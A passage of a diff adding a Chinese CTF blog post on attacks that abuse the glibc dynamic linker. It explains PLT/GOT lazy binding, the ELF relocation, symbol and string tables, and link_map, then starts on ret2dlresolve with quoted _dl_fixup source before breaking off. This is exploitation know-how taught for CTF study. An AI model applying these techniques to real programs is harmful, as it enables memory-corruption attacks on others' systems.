@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="小pwn手不得不品的dl魔法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dl相关攻击汇总">
+<meta property="og:url" content="http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/index.html">
+<meta property="og:site_name" content="Whirling-In-Rags">
+<meta property="og:description" content="小pwn手不得不品的dl魔法">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-03-05T13:27:55.000Z">
+<meta property="article:modified_time" content="2024-03-05T13:30:02.375Z">
+<meta property="article:author" content="DeePunk">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>dl相关攻击汇总</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Whirling-In-Rags" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/DeePunk42">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023%EF%BC%9A%E5%9C%A8%E9%80%83%E7%A6%BB%E4%B9%8B%E5%90%8E/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&text=dl相关攻击汇总"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&title=dl相关攻击汇总"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&is_video=false&description=dl相关攻击汇总"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=dl相关攻击汇总&body=Check out this article: http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&title=dl相关攻击汇总"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&title=dl相关攻击汇总"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&title=dl相关攻击汇总"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&title=dl相关攻击汇总"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&name=dl相关攻击汇总&description=小pwn手不得不品的dl魔法"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&t=dl相关攻击汇总"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5"><span class="toc-number">1.</span> <span class="toc-text">动态链接</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%BA%E5%88%B6"><span class="toc-number">1.1.</span> <span class="toc-text">机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.</span> <span class="toc-text">实现结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#interp%E6%AE%B5"><span class="toc-number">1.2.1.</span> <span class="toc-text">.interp段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dynamic%E6%AE%B5"><span class="toc-number">1.2.2.</span> <span class="toc-text">.dynamic段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DT-REL%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">DT_REL动态链接重定位表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DT-SYMTAB-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E7%AC%A6%E5%8F%B7%E8%A1%A8"><span class="toc-number">1.2.4.</span> <span class="toc-text">DT_SYMTAB 动态链接符号表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DT-STRTAB-%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A1%A8"><span class="toc-number">1.2.5.</span> <span class="toc-text">DT_STRTAB 动态链接字符串表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#link-map"><span class="toc-number">1.2.6.</span> <span class="toc-text">link_map</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.7.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2dlresolve"><span class="toc-number">2.</span> <span class="toc-text">ret2dlresolve</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B"><span class="toc-number">2.2.</span> <span class="toc-text">例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#64%E4%BD%8D%E6%83%85%E5%86%B5"><span class="toc-number">2.3.</span> <span class="toc-text">64位情况</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dl-fini%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">_dl_fini的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%80%A7"><span class="toc-number">3.1.</span> <span class="toc-text">特性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HitconCTF2023-Wall-Sina"><span class="toc-number">3.2.</span> <span class="toc-text">HitconCTF2023 Wall-Sina</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#House-of-Blindness"><span class="toc-number">3.3.</span> <span class="toc-text">House of Blindness</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        dl相关攻击汇总
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">DeePunk</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-03-05T13:27:55.000Z" class="dt-published" itemprop="datePublished">2024-03-05</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CS/">CS</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h1><h2 id="机制"><a href="#机制" class="headerlink" title="机制"></a>机制</h2><p>使用动态链接时，程序按模块拆分为多个独立部分，在程序运行时才链接在一起。linux中ELF动态链接文件称为动态共享对象(DSO)，以<code>.so</code>为拓展名。常用的C语言运行库glibc保存为<code>libc.so</code>。</p>
+<p>链接的操作由动态链接器ld完成。运行时动态链接器与普通共享对象一同被映射到进程的地址空间，程序在运行时首先运行ld，完成所有动态链接工作后再转交主程序。</p>
+<p>如果程序中存在跨模块的数据访问，由于目标变量的地址要在装载时才能确定，需要使得程序中的代码地址无关。于是把跟地址相关的代码放在数据段里，即全局偏移表(Global Offset Table)。至于模块间的调用，跳转，也用GOT表实现，但是出于效率考虑，需要引入延迟绑定机制。</p>
+<p>延迟绑定(Lazy Binding)的思想是在程序第一次用到时才绑定(符号查找，重定位)，使用PLT表(Procedure Linkage Table)实现，实现代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PLT0:</span><br><span class="line">push *(GOT + 4)</span><br><span class="line">jump *(GOT + 8)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">bar@plt:</span><br><span class="line">jmp *(bar@GOT)</span><br><span class="line">push n</span><br><span class="line">jump PLT0</span><br></pre></td></tr></table></figure>
+<p>(此处的实现与之后的利用密切相关)</p>
+<p>其中<code>bar@GOT</code>中初始保存<code>bar@plt</code>的下一条指令(原地tp)，随后push的n是bar在重定位表项中的序号。<code>GOT + 4</code> 中保存一个名为<code>link_map</code>的结构体的地址，它保存了本模块动态链接的相关信息，<code>GOT + 8</code>中保存<code>_dl_runtime_resolve()</code>的地址，该函数的作用便是解析<code>link_map</code>，计算出bar函数的真正地址，并将其填入<code>bar@GOT</code>中</p>
+<h2 id="实现结构"><a href="#实现结构" class="headerlink" title="实现结构"></a>实现结构</h2><h3 id="interp段"><a href="#interp段" class="headerlink" title=".interp段"></a><code>.interp</code>段</h3><p>一个字符串，动态连接器的路径</p>
+<h3 id="dynamic段"><a href="#dynamic段" class="headerlink" title=".dynamic段"></a><code>.dynamic</code>段</h3><p><code>readelf -d Lib.so</code>查看<br>保存了动态连接器所需的基本信息，结构如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   Elf32_Sword   d_tag;          <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">   <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">       Elf32_Word d_val;         <span class="comment">/* Integer value */</span></span><br><span class="line">       Elf32_Addr d_ptr;         <span class="comment">/* Address value */</span></span><br><span class="line">     &#125; d_un;</span><br><span class="line"> &#125; Elf32_Dyn;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	Elf64_Sxword d_tag; <span class="comment">/* Dynamic entry type */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">	  &#123;</span></span><br><span class="line">		Elf64_Xword d_val; <span class="comment">/* Integer value */</span></span><br><span class="line">		Elf64_Addr d_ptr; <span class="comment">/* Address value */</span></span><br><span class="line">	  &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>
+<p>在<code>elf.h</code>中定义了不同d_tag的值与对应类型，后面比较常用的有</p>
+<ul>
+<li><code>DT_REL</code> 动态链接重定位表地址</li>
+<li><code>DT_SYMTAB</code> 动态链接符号表地址</li>
+<li><code>DT_STRTAB</code> 动态链接字符串表地址</li>
+<li><code>DT_INIT</code> 初始化代码地址</li>
+<li><code>DT_FINI</code> 结束代码地址</li>
+</ul>
+<h3 id="DT-REL动态链接重定位表"><a href="#DT-REL动态链接重定位表" class="headerlink" title="DT_REL动态链接重定位表"></a><code>DT_REL</code>动态链接重定位表</h3><p><code>readelf -r Lib.so</code>查看<br>共享对象的重定位在装载时完成，重定位表分为<code>.rel.dyn</code>和<code>.rel.plt</code>。前者修正数据引用，即<code>.got</code>和<code>.data</code>；后者修正<code>.got.plt</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	Elf32_Addr r_offset; <span class="comment">/* Address */</span></span><br><span class="line">	Elf32_Word r_info; <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	Elf64_Addr r_offset; <span class="comment">/* Address */</span></span><br><span class="line">	Elf64_Xword r_info; <span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf64_Rel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* How to extract and insert information held in the r_info field. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_R_SYM(val) ((val) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_R_TYPE(val) ((val) &amp; 0xff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_R_INFO(sym, type) (((sym) &lt;&lt; 8) + ((type) &amp; 0xff))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_SYM(i) ((i) &gt;&gt; 32)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_TYPE(i) ((i) &amp; 0xffffffff)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_R_INFO(sym,type) ((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))</span></span><br></pre></td></tr></table></figure>
+<p><code>r_offset</code>表示需要修正的地址，<code>r_info</code>高位表示该符号在符号表中的序号，低位表示符号类型。</p>
+<h3 id="DT-SYMTAB-动态链接符号表"><a href="#DT-SYMTAB-动态链接符号表" class="headerlink" title="DT_SYMTAB 动态链接符号表"></a><code>DT_SYMTAB</code> 动态链接符号表</h3><p><code>readelf -sD Lib.so</code>查看<br>通常保存在段<code>.dynsym</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	Elf32_Word st_name; <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">	Elf32_Addr st_value; <span class="comment">/* Symbol value */</span></span><br><span class="line">	Elf32_Word st_size; <span class="comment">/* Symbol size */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> st_other; <span class="comment">/* Symbol visibility */</span></span><br><span class="line">	Elf32_Section st_shndx; <span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	Elf64_Word st_name; <span class="comment">/* Symbol name (string tbl index) */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">/* Symbol type and binding */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> st_other; <span class="comment">/* Symbol visibility */</span></span><br><span class="line">	Elf64_Section st_shndx; <span class="comment">/* Section index */</span></span><br><span class="line">	Elf64_Addr st_value; <span class="comment">/* Symbol value */</span></span><br><span class="line">	Elf64_Xword st_size; <span class="comment">/* Symbol size */</span></span><br><span class="line">&#125; Elf64_Sym;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* How to extract and insert information held in the st_info field. */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_BIND(val) (((unsigned char) (val)) &gt;&gt; 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_TYPE(val) ((val) &amp; 0xf)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF32_ST_INFO(bind, type) (((bind) &lt;&lt; 4) + ((type) &amp; 0xf))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Both Elf32_Sym and Elf64_Sym use the same one-byte st_info field. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_ST_BIND(val) ELF32_ST_BIND (val)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_ST_TYPE(val) ELF32_ST_TYPE (val)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ELF64_ST_INFO(bind, type) ELF32_ST_INFO ((bind), (type))</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="DT-STRTAB-动态链接字符串表"><a href="#DT-STRTAB-动态链接字符串表" class="headerlink" title="DT_STRTAB 动态链接字符串表"></a><code>DT_STRTAB</code> 动态链接字符串表</h3><p><code>.dynstr</code>中<br>存储字符串，无需赘述</p>
+<h3 id="link-map"><a href="#link-map" class="headerlink" title="link_map"></a><code>link_map</code></h3><p>一个结构体，保存动态链接相关信息<br>代码太长不贴，有两个比较重要的部分</p>
+<ul>
+<li><code>l_addr</code> 程序的基址</li>
+<li><code>l_info[]</code>一个数组，保存了多个重定位项的地址</li>
+</ul>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>调用<code>_dl_runtime_resolve</code>时，传参<code>link_map</code>和<code>rel_offset</code>，查找流程如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map, rel_offset)</span><br><span class="line">                                       +</span><br><span class="line">          +-----------+                |</span><br><span class="line">          | Elf32_Rel | &lt;--------------+</span><br><span class="line">          +-----------+</span><br><span class="line">     +--+ | r_offset  |        +-----------+</span><br><span class="line">     |    |  r_info   | +----&gt; | Elf32_Sym |</span><br><span class="line">     |    +-----------+        +-----------+      +----------+</span><br><span class="line">     |      .rel.plt           |  st_name  | +--&gt; | system\<span class="number">0</span> |</span><br><span class="line">     |                         |           |      +----------+</span><br><span class="line">     v                         +-----------+        .dynstr</span><br><span class="line">+----+-----+                      .dynsym</span><br><span class="line">| &lt;system&gt; |</span><br><span class="line">+----------+</span><br><span class="line">  .got.plt</span><br></pre></td></tr></table></figure>
+
+<h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>调用<code>_dl_runtime_resolve</code>后，实际完成绑定工作的是其中调用的<code>_dl_fixup</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This function is called through a special trampoline from the PLT the</span></span><br><span class="line"><span class="comment">first time each PLT entry is called. We must perform the relocation</span></span><br><span class="line"><span class="comment">specified in the PLT of the given shared object, and return the resolved</span></span><br><span class="line"><span class="comment">function address to the trampoline, which will restart the original call</span></span><br><span class="line"><span class="comment">to that address. Future calls will bounce directly from the PLT to the</span></span><br><span class="line"><span class="comment">function. */</span></span><br><span class="line"></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">		ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">		<span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span><br><span class="line">	 = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">uintptr_t</span> pltgot = (<span class="type">uintptr_t</span>) D_PTR (l, l_info[DT_PLTGOT]);</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">	 = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL])</span><br><span class="line">			+ reloc_offset (pltgot, reloc_arg));</span><br><span class="line">	<span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">	<span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;</span><br><span class="line">	<span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">	<span class="type">lookup_t</span> 